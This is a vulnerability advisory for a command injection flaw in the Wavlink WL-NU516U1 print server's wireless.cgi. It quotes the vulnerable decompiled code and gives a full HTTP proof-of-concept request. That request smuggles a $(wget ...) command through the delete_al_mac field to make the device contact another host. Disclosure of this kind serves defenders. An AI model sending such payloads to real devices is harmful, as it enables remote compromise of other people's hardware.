# WL-NU516U1 wireless.cgi DeleteMac delete_al_mac Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `DeleteMac`, the function `sub_402D1C` is invoked.

The function reads `delete_al_mac` from POST data via `sub_405EA8` and concatenates it into a shell command:

```c
sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", v4, v6, v8, v10);
sub_405314(v20);  // calls system()
```

The `delete_al_mac` parameter is the 2nd argument in the sprintf call (variable `v6`). No sanitization is applied.

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 82

page=DeleteMac&delete_list=AA&delete_al_mac=$(wget http://192.168.6.1:6666/del_al)
```
